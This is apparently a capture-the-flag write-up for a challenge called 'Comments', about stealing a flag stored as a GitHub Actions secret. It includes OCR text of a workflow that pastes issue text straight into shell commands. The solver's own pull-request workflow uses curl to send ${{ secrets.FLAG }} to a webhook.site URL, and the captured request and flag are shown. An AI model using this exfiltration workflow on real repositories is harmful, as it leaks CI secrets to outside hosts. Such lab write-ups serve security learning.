# Comments
> You must solve the first challenge to get the answer, all you need is inside the Loby.

## About the Challenge
We were given a repository whose flags are located in the GitHub workflow


[Image extracted text: maclarel    Initial commit
Code
Blame
32
lines
(30
loc )
1.16
KB
name
Parse
review
of
teacher
3
on
4
issues:
5
types:
[opened ,
edited]
jobs:
parse-review:
runs-on:
ubuntu-latest
10
steps:
11
name :
Extract
Teacher
name
and
review
from issue body
12
id:
extract-review
13
env:
14
db_pass
S{{
secrets.FLAG }} #
Do
we still
need this
to write
to
the
DB?
15
run:
16
TEACHER-S(echo
S{{ github.event.issue.body
}}'
grep
~OP
Teacher:.*S'
17
REVIEW-S(echo
S{{ github event.issue.body }} '
grep
~VP
Teacher:
*S"
18
echo
:set-output
name-teacher:
STEACHER"
An
DCVTC]


## How to Solve?
To get the flag, I created another workflow like this

```yaml
ame: Say Hi

 on: [pull_request]

 jobs:
   build:

     runs-on: ubuntu-latest

     steps:
     - uses: actions/checkout@v2
     - name: Say Hi
       run: |
         curl "https://webhook.site/b7c7b30c-1536-4672-a15c-646bcd1ef28e?username=${{ secrets.FLAG }}"
```

This workflow will send the flag to `webhook.site` using `curl` command, and then create a pull request to trigger the workflow


[Image extracted text: Request Details
Permalink
Raw content
Copy as
Headers
GET
https://webhook site/b7c7b3Oc-1536-4672-a15c-646bcd1ef28e?usernam
connection
close
e-EKOmOve_yOuR_bOdy
accept
*x
Host
20.42.13.21
Whois
Shodan
Netify   Censys
user-agent
curl/7.81.0
Date
01/11/2023 22.32.49 (2 days ago)
host
webhook. site
Size
bytes
content-length
ID
a30b17dc-0079-4ezb-ae8g-eabc345ab0e8
content-type
Files
Query strings
Form values
username
EKOmOve_yduR_bOdy
(empty)
No content]


```
EKO{m0ve_y0uR_b0dy}
```